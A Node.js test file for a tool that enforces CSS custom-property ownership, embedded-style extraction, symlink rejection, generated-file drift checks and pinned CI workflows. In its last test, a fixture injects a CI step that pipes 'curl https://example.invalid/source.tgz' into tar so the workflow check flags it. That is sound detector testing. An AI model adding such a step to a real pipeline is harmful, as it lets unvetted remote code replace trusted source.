        'const View=()=> <style children={[":root{--surface-", , [null, false, "canvas"], ":red}"]}/>;',
      css: ":root{--surface-canvas:red}",
      issue: /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/,
    },
    {
      label: "unresolved array element",
      fixture:
        'const View=()=> <style children={[".safe{color:", themeColor, "}"]}/>;',
      placeholder: true,
    },
    {
      label: "unresolved array spread",
      fixture: 'const View=()=> <style children={[".safe{color:", ...colors, "}"]}/>;',
      placeholder: true,
    },
    {
      label: "benign static CSS",
      fixture: 'const View=()=> <style children={".safe{color:var(--text-high)}"}/>;',
      css: ".safe{color:var(--text-high)}",
    },
  ];

  for (const item of cases) {
    const result = embeddedOwnership(
      item.fixture,
      item.path ?? `packages/example/${item.label.replaceAll(" ", "-")}.tsx`,
    );
    assert.equal(result.styles.size, 1, item.label);
    const css = [...result.styles.values()][0];
    if (item.css !== undefined) assert.equal(css, item.css, item.label);
    if (item.placeholder) {
      assert.match(css, /var\(--champagne-embedded-style-expression\)/, item.label);
    }
    if (item.issue) assert.match(result.issues, item.issue, item.label);
    else assert.equal(result.issues, "", item.label);
  }
});

test("ambiguous style content representations fail closed", () => {
  const cases = [
    [
      "duplicate explicit children attributes",
      'const View=()=> <style children={".safe{}"} children={":root{--surface-canvas:red}"}/>;',
    ],
    [
      "explicit children and dangerouslySetInnerHTML attributes coexist",
      'const View=()=> <style children={".safe{}"} dangerouslySetInnerHTML={{__html:":root{--surface-canvas:red}"}}/>;',
    ],
    [
      "explicit children attribute and nested JSX children coexist",
      'const View=()=> <style children={".safe{}"}>:root&#123;--surface-canvas:red&#125;</style>;',
    ],
    [
      "dangerouslySetInnerHTML attribute and nested JSX children coexist",
      'const View=()=> <style dangerouslySetInnerHTML={{__html:".safe{}"}}>.nested&#123;color:red&#125;</style>;',
    ],
  ];
  for (const [message, fixture] of cases) {
    assert.throws(
      () => extractEmbeddedStyleSources(fixture, "apps/web/app/Ambiguous.tsx"),
      (error) =>
        error instanceof Error &&
        error.message.includes("[EMBEDDED_STYLE_CONTENT_AMBIGUITY]") &&
        error.message.includes(message),
      message,
    );
  }
});

test("duplicate governed dangerous-style representations fail closed", () => {
  const duplicateProperties = [
    '{ __html: ".safe{}", __html: ":root{--surface-canvas:red}" }',
    '{ __html: ".safe{}", ["__html"]: ":root{--surface-canvas:red}" }',
    '{ ["__html"]: ".safe{}", __html: ":root{--surface-canvas:red}" }',
    '{ __html: ":root{--surface-canvas:red}", __html: ".safe{}" }',
    '{ __html: ".safe{}", __html: ".safe{}" }',
    '{ "__html": ".safe{}", [`__html`]: ".safe{}" }',
  ];
  for (const objectSource of duplicateProperties) {
    assert.throws(
      () =>
        extractEmbeddedStyleSources(
          `const View = () => <style dangerouslySetInnerHTML={${objectSource}} />;`,
          "apps/web/app/Duplicate.tsx",
        ),
      /\[EMBEDDED_STYLE_DUPLICATE_DANGEROUS_REPRESENTATION\].*statically recognised __html properties/,
    );
  }

  const duplicateAttributes = [
    [".safe{}", ":root{--surface-canvas:red}"],
    [":root{--surface-canvas:red}", ".safe{}"],
    [".safe{}", ".safe{}"],
  ];
  for (const [first, second] of duplicateAttributes) {
    assert.throws(
      () =>
        extractEmbeddedStyleSources(
          `const View = () => <style dangerouslySetInnerHTML={{ __html: "${first}" }} dangerouslySetInnerHTML={{ __html: "${second}" }} />;`,
          "apps/web/app/Duplicate.tsx",
        ),
      /\[EMBEDDED_STYLE_DUPLICATE_DANGEROUS_REPRESENTATION\].*dangerouslySetInnerHTML attributes/,
    );
  }
});

test("first-party CSS topology includes app and package source while excluding tests and outputs", async (t) => {
  const dir = await tempCollectorTree(t);
  const fixtures = new Map([
    ["apps/web/app/global.css", ".app{color:var(--text-high)}\n"],
    ["packages/example/root.css", ".package{color:var(--text-high)}\n"],
    ["packages/example/nested/owner.css", ":root{--surface-canvas:red}\n"],
    [
      "packages/example/nested/registration.css",
      "@property --surface-canvas{syntax:'<color>';inherits:false;initial-value:red}\n",
    ],
    ["packages/example/tests/ignored.css", ":root{--surface-canvas:red}\n"],
    ["packages/example/__tests__/ignored.css", ":root{--surface-canvas:red}\n"],
    ["packages/example/fixture.test.css", ":root{--surface-canvas:red}\n"],
    ["packages/example/fixture.spec.css", ":root{--surface-canvas:red}\n"],
    ["packages/example/dist/ignored.css", ":root{--surface-canvas:red}\n"],
    ["packages/example/node_modules/dependency.css", ":root{--surface-canvas:red}\n"],
  ]);
  for (const [relativePath, contents] of fixtures) {
    await writeCollectorFixture(dir, relativePath, contents);
  }

  const result = await collectedFirstPartyCssResult(dir);
  assert.deepEqual([...result.styles.keys()], [
    "apps/web/app/global.css",
    "packages/example/nested/owner.css",
    "packages/example/nested/registration.css",
    "packages/example/root.css",
  ]);
  assert.match(result.ownershipIssues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
  assert.match(result.registrationIssues, /MATERIAL_REGISTRATION_UNAPPROVED.*--surface-canvas/);

  const realFiles = collectFirstPartyCssFiles(root).map((file) => path.relative(root, file));
  assert.equal(realFiles.includes("packages/champagne-tokens/hero-surfaces.css"), true);

  const symlinkRepo = await tempCollectorTree(t);
  await writeCollectorFixture(symlinkRepo, "apps/web/app/global.css", ".safe{color:red}\n");
  await writeCollectorFixture(symlinkRepo, "packages/example/owner.css", ":root{--surface-canvas:red}\n");
  await symlink("owner.css", path.join(symlinkRepo, "packages/example/linked.css"), "file");
  assert.throws(
    () => collectFirstPartyCssFiles(symlinkRepo),
    /\[CSS_SYMLINK_UNAPPROVED\] packages[\\/]example[\\/]linked\.css/,
  );
});

test("CONSOLIDATED_STATIC_STYLE_FINITE_CONTRACT exercises the complete bounded matrix", async (t) => {
  const embeddedMatrix = [
    ["raw JSX text", "const View=()=> <style>/* benign raw JSX text */</style>;", "benign", "packages/example/Raw.js"],
    ["app source", "const View=()=> <style>{`.safe{color:var(--text-high)}`}</style>;", "benign", "apps/web/app/Matrix.tsx"],
    ["cooked JSX entities", "const View=()=> <style>:root &#123; --surface-&#99;anvas:red &#125;</style>;", "owner"],
    ["string literal", 'const View=()=> <style>{":root{--surface-canvas:red}"}</style>;', "owner"],
    ["no-substitution template", "const View=()=> <style>{`:root{--surface-canvas:red}`}</style>;", "owner"],
    ["template expression", "const color='red';const View=()=> <style>{`:root{--surface-canvas:${color}}`}</style>;", "owner-placeholder"],
    ["null child", "const View=()=> <style>:root &#123; --surface{null}-canvas:red &#125;</style>;", "owner"],
    ["true child", "const View=()=> <style>:root &#123; --surface{true}-canvas:red &#125;</style>;", "owner"],
    ["false child", "const View=()=> <style>:root &#123; --surface{false}-canvas:red &#125;</style>;", "owner"],
    ["number child", "const View=()=> <style>:root &#123; --ink-{100}:red &#125;</style>;", "owner"],
    ["BigInt child", "const View=()=> <style>:root &#123; --ink-{100n}:red &#125;</style>;", "owner"],
    ["nested array child", 'const View=()=> <style>{[":root{--surface-",["canvas",null],":red}"]}</style>;', "owner"],
    ["adjacent benign fragments", "const View=()=> <style>.safe&#123;margin:{100}px&#125;</style>;", "benign"],
    ["unresolved expression", "const View=()=> <style>.safe&#123;color:{themeColor}&#125;</style>;", "placeholder"],
    ["quoted children prop", 'const View=()=> <style children=":root&#123;--surface-&#99;anvas:red&#125;"/>;', "owner", "packages/example/Children.js"],
    ["array children prop", 'const View=()=> <style children={[":root{--surface-",["canvas"],":red}"]}/>;', "owner"],
    ["dynamic children prop", "const color='red';const View=()=> <style children={`:root{--surface-canvas:${color}}`}/>;", "owner-placeholder"],
    ["direct __html", 'const View=()=> <style dangerouslySetInnerHTML={{__html:":root{--surface-canvas:red}"}}/>;', "owner"],
    ["quoted __html", 'const View=()=> <style dangerouslySetInnerHTML={{"__html":":root{--surface-canvas:red}"}}/>;', "owner"],
    ["computed literal __html", 'const View=()=> <style dangerouslySetInnerHTML={{["__html"]:":root{--surface-canvas:red}"}}/>;', "owner"],
    ["transparent wrappers", 'const View=()=> <style dangerouslySetInnerHTML={(({__html:":root{--surface-canvas:red}"}) as const)!}/>', "owner"],
    ["protected registration", "const View=()=> <style dangerouslySetInnerHTML={{__html:\"@property --surface-canvas{syntax:'<color>';inherits:false;initial-value:red}\"}}/>", "registration"],
    ["benign dangerous value", 'const View=()=> <style dangerouslySetInnerHTML={{__html:".safe{color:var(--text-high)}"}}/>;', "benign"],
  ];
  for (const [label, fixture, expected, explicitSourcePath] of embeddedMatrix) {
    const extension = label === "quoted __html" ? ".jsx" : ".tsx";
    const result = embeddedOwnership(
      fixture,
      explicitSourcePath ?? `packages/example/${label.replaceAll(" ", "-")}${extension}`,
    );
    if (expected.includes("owner")) assert.match(result.issues, /MATERIAL_OWNER_UNAPPROVED/);
    if (expected === "registration") assert.match(result.issues, /MATERIAL_REGISTRATION_UNAPPROVED/);
    if (expected === "benign") assert.equal(result.issues, "");
    if (expected.includes("placeholder")) {
      assert.match([...result.styles.values()][0], /var\(--champagne-embedded-style-expression\)/);
    }
  }
  for (const fixture of [
    'const View=()=> <style dangerouslySetInnerHTML={{__html:".safe{}",["__html"]:".safe{}"}}/>;',
    'const View=()=> <style dangerouslySetInnerHTML={{__html:".safe{}"}} dangerouslySetInnerHTML={{__html:".safe{}"}}/>;',
  ]) {
    assert.throws(
      () => extractEmbeddedStyleSources(fixture, "apps/web/app/DuplicateMatrix.tsx"),
      /EMBEDDED_STYLE_DUPLICATE_DANGEROUS_REPRESENTATION/,
    );
  }

  const cssMatrix = [
    ["escaped owner", String.raw`:root{--surface-\63 anvas:red}`, /MATERIAL_OWNER_UNAPPROVED/],
    ["comment-separated owner", ":root{--surface/**/-canvas:red}", /MATERIAL_OWNER_UNAPPROVED/],
    ["malformed CSS", ":root{--surface-canvas:red", /CSS_DECLARATION_PARSE/],
    ["nested media", "@media(min-width:1px){:root{--surface-canvas:red}}", /MATERIAL_OWNER_UNAPPROVED/],
    ["nested supports", "@supports(display:grid){:root{--surface-canvas:red}}", /MATERIAL_OWNER_UNAPPROVED/],
    ["nested layer", "@layer theme{:root{--surface-canvas:red}}", /MATERIAL_OWNER_UNAPPROVED/],
    ["protected registration", "@property --surface-canvas{syntax:'<color>';inherits:false;initial-value:red}", /MATERIAL_REGISTRATION_UNAPPROVED/],
    ["duplicate owner", ":root{--surface-canvas:red;--surface-canvas:blue}", /MATERIAL_OWNER_UNAPPROVED/],
  ];
  for (const [label, css, expected] of cssMatrix) {
    const issues = materialOwnershipErrors({
      cssSources: baseline([[`packages/example/${label.replaceAll(" ", "-")}.css`, css]]),
      materialSource: source,
      renderedMaterial: rendered,
    }).join("\n");
    assert.match(issues, expected);
  }
  assert.equal(materialOwnershipErrors({ cssSources: baseline(), materialSource: source, renderedMaterial: rendered }).length, 0);
  assert.deepEqual(timeOfDayCanvasOwnerErrors(timeCss), []);

  const topology = await tempCollectorTree(t);
  await writeCollectorFixture(topology, "apps/web/app/app.css", ".safe{color:red}\n");
  await writeCollectorFixture(topology, "packages/example/nested/package.css", ".safe{color:red}\n");
  await writeCollectorFixture(topology, "packages/example/tests/ignored.css", ":root{--surface-canvas:red}\n");
  assert.deepEqual(
    collectFirstPartyCssFiles(topology).map((file) => path.relative(topology, file)),
    ["apps/web/app/app.css", "packages/example/nested/package.css"],
  );
  await symlink(
    "package.css",
    path.join(topology, "packages/example/nested/linked.css"),
    "file",
  );
  assert.throws(
    () => collectFirstPartyCssFiles(topology),
    /\[CSS_SYMLINK_UNAPPROVED\].*linked\.css/,
  );
});

test("CSS beneath generated directories is collected and protected owners are rejected", async (t) => {
  const dir = await tempCollectorTree(t);
  await writeCollectorFixture(dir, "generated/owner.css", ":root{--surface-canvas:red}\n");
  const result = await collectedCssResult(dir);
  assert.deepEqual([...result.styles.keys()], ["generated/owner.css"]);
  assert.match(result.ownershipIssues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
});

test("CSS beneath vendor directories is collected and protected registrations are rejected", async (t) => {
  const dir = await tempCollectorTree(t);
  await writeCollectorFixture(
    dir,
    "vendor/registration.css",
    ":root{--surface-canvas:red}@property --surface-canvas{syntax:'<color>';inherits:false;initial-value:red}\n",
  );
  const result = await collectedCssResult(dir);
  assert.deepEqual([...result.styles.keys()], ["vendor/registration.css"]);
  assert.match(result.ownershipIssues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
  assert.match(result.registrationIssues, /MATERIAL_REGISTRATION_UNAPPROVED.*--surface-canvas/);
});

test("embedded styles beneath generated directories are collected and protected owners are rejected", async (t) => {
  const dir = await tempCollectorTree(t);
  await writeCollectorFixture(
    dir,
    "generated/Owner.tsx",
    "export const View = () => <style>{`:root{--surface-canvas:red}`}</style>;\n",
  );
  const result = collectedEmbeddedResult(dir);
  assert.equal(result.styles.size, 1);
  assert.match([...result.styles.keys()][0], /^generated\/Owner\.tsx:\d+:\d+ <style>$/);
  assert.match(result.ownershipIssues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
});

test("embedded styles beneath vendor directories are collected and protected owners are rejected", async (t) => {
  const dir = await tempCollectorTree(t);
  await writeCollectorFixture(
    dir,
    "vendor/Owner.jsx",
    "export const View = () => <style dangerouslySetInnerHTML={{__html: ':root{--surface-canvas:red}'}} />;\n",
  );
  const result = collectedEmbeddedResult(dir);
  assert.equal(result.styles.size, 1);
  assert.match([...result.styles.keys()][0], /^vendor\/Owner\.jsx:\d+:\d+ <style>$/);
  assert.match(result.ownershipIssues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
});

test("benign CSS beneath generated and vendor directories remains permitted", async (t) => {
  const dir = await tempCollectorTree(t);
  await writeCollectorFixture(dir, "generated/safe.css", ".safe{color:var(--text-high)}\n");
  await writeCollectorFixture(dir, "vendor/safe.css", ".safe{background:var(--surface-0)}\n");
  const result = await collectedCssResult(dir);
  assert.deepEqual([...result.styles.keys()], ["generated/safe.css", "vendor/safe.css"]);
  assert.equal(result.ownershipIssues, "");
  assert.equal(result.registrationIssues, "");
});

test("benign embedded styles beneath generated and vendor directories remain permitted", async (t) => {
  const dir = await tempCollectorTree(t);
  await writeCollectorFixture(
    dir,
    "generated/Safe.tsx",
    "export const View = () => <style>{`.safe{color:var(--text-high)}`}</style>;\n",
  );
  await writeCollectorFixture(
    dir,
    "vendor/Safe.jsx",
    "export const View = () => <style>{`.safe{background:var(--surface-0)}`}</style>;\n",
  );
  const result = collectedEmbeddedResult(dir);
  assert.equal(result.styles.size, 2);
  assert.equal(result.ownershipIssues, "");
  assert.equal(result.registrationIssues, "");
});

test("genuine build and dependency trees remain excluded", async (t) => {
  const dir = await tempCollectorTree(t);
  for (const excluded of ["node_modules", ".next", "dist", "build", "coverage", ".git", ".turbo"]) {
    await writeCollectorFixture(dir, `${excluded}/owner.css`, ":root{--surface-canvas:red}\n");
    await writeCollectorFixture(
      dir,
      `${excluded}/Owner.tsx`,
      "export const View = () => <style>{`:root{--surface-canvas:red}`}</style>;\n",
    );
  }
  assert.deepEqual(collectCssFiles(dir, dir), []);
  assert.deepEqual([...collectEmbeddedStyleSources(dir, dir)], []);
});

test("test and spec source fixtures remain excluded according to the existing contract", async (t) => {
  const dir = await tempCollectorTree(t);
  await writeCollectorFixture(dir, "__tests__/owner.css", ":root{--surface-canvas:red}\n");
  await writeCollectorFixture(
    dir,
    "__tests__/Owner.tsx",
    "export const View = () => <style>{`:root{--surface-canvas:red}`}</style>;\n",
  );
  await writeCollectorFixture(
    dir,
    "Component.test.tsx",
    "export const View = () => <style>{`:root{--surface-canvas:red}`}</style>;\n",
  );
  await writeCollectorFixture(
    dir,
    "Component.spec.jsx",
    "export const View = () => <style>{`:root{--surface-canvas:red}`}</style>;\n",
  );
  assert.deepEqual(collectCssFiles(dir, dir), []);
  assert.deepEqual([...collectEmbeddedStyleSources(dir, dir)], []);
});

test("current first-party embedded style blocks pass without false positives", () => {
  const styles = new Map([
    ...collectEmbeddedStyleSources(path.join(root, "apps/web/app"), root),
    ...collectEmbeddedStyleSources(path.join(root, "packages"), root),
  ]);
  assert.equal(styles.size >= 7, true);
  assert.equal(
    materialOwnershipErrors({
      cssSources: baseline([...styles]),
      materialSource: source,
      renderedMaterial: rendered,
    }).join("\n"),
    "",
  );
});

test("protected CSS and embedded-style trees reject file and directory symlinks", async (t) => {
  const dir = await mkdtemp(path.join(tmpdir(), "champagne-css-symlink-"));
  t.after(() => rm(dir, { recursive: true, force: true }));
  const fileTree = path.join(dir, "file-tree");
  const nested = path.join(fileTree, "nested");
  await mkdir(nested, { recursive: true });
  await writeFile(path.join(fileTree, "owner.css"), ":root{--surface-canvas:var(--surface-1)}\n");
  await symlink("../owner.css", path.join(nested, "linked.module.css"), "file");
  assert.throws(
    () => collectCssFiles(fileTree, fileTree),
    /\[CSS_SYMLINK_UNAPPROVED\] nested[\\/]linked\.module\.css/,
  );
  const directoryTree = path.join(dir, "directory-tree");
  const real = path.join(directoryTree, "real");
  await mkdir(real, { recursive: true });
  await writeFile(path.join(real, "owner.css"), ":root{--ink:#000000}\n");
  await symlink("real", path.join(directoryTree, "linked"), "dir");
  assert.throws(() => collectCssFiles(directoryTree, directoryTree), /\[CSS_SYMLINK_UNAPPROVED\] linked/);
  const embeddedTree = path.join(dir, "embedded-tree");
  await mkdir(embeddedTree, { recursive: true });
  await writeFile(path.join(embeddedTree, "owner.tsx"), "export const View = () => <style>{`.safe{color:red}`}</style>;\n");
  await symlink("owner.tsx", path.join(embeddedTree, "linked.tsx"), "file");
  assert.throws(
    () => collectEmbeddedStyleSources(embeddedTree, embeddedTree),
    /\[EMBEDDED_STYLE_SYMLINK_UNAPPROVED\] linked\.tsx/,
  );
});

test("missing references and cycles fail deterministically", () => {
  const missing = clone(source);
  missing.outputs.canvas = "missingNode";
  assert.throws(() => renderMaterial(missing, primitive), /REF_MISSING/);
  const cyclic = clone(source);
  cyclic.nodes.find((node) => node.id === "canvas").left.ref = "canvas";
  assert.throws(() => renderMaterial(cyclic, primitive), /REF_CYCLE/);
});

test("transparent canvas output fails closed", () => {
  const transparent = clone(source);
  const node = transparent.nodes.find((item) => item.id === "transparent");
  node.id = "clear";
  transparent.outputs.canvas = "clear";
  assert.throws(() => renderMaterial(transparent, primitive), /CANVAS_OPACITY/);
});

test("write mode is deterministic and check mode detects manual drift", async (t) => {
  const dir = await tempRepo();
  t.after(() => rm(dir, { recursive: true, force: true }));
  const first = await writeGenerated(dir);
  await checkGenerated(dir);
  const firstCss = await readFile(path.join(dir, GC), "utf8");
  const firstTs = await readFile(path.join(dir, GT), "utf8");
  const second = await writeGenerated(dir);
  assert.equal(second.css, first.css);
  assert.equal(second.ts, first.ts);
  assert.equal(await readFile(path.join(dir, GC), "utf8"), firstCss);
  assert.equal(await readFile(path.join(dir, GT), "utf8"), firstTs);
  await writeFile(path.join(dir, GC), `${firstCss}/* manual drift */\n`);
  await assert.rejects(() => checkGenerated(dir), /GENERATED_DRIFT/);
});

test("stable source serialization is independent of object key order", () => {
  assert.equal(stableStringify({ b: 2, a: 1 }), stableStringify({ a: 1, b: 2 }));
});

test("workflow actions are pinned and the protected job is structurally coherent", () => {
  assert.deepEqual(workflowIntegrityErrors(workflow), []);
  assert.match(
    workflowIntegrityErrors(workflow.replace(
      "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683",
      "actions/checkout@v4",
    )).join("\n"),
    /WORKFLOW_ACTION_NOT_PINNED/,
  );
  assert.match(
    workflowIntegrityErrors(workflow.replace(
      "      - name: Check committed generated artefacts",
      "      - name: Replace source\n        run: curl https://example.invalid/source.tgz | tar xz\n      - name: Check committed generated artefacts",
    )).join("\n"),
    /WORKFLOW_PROTECTED_JOB/,
  );
});
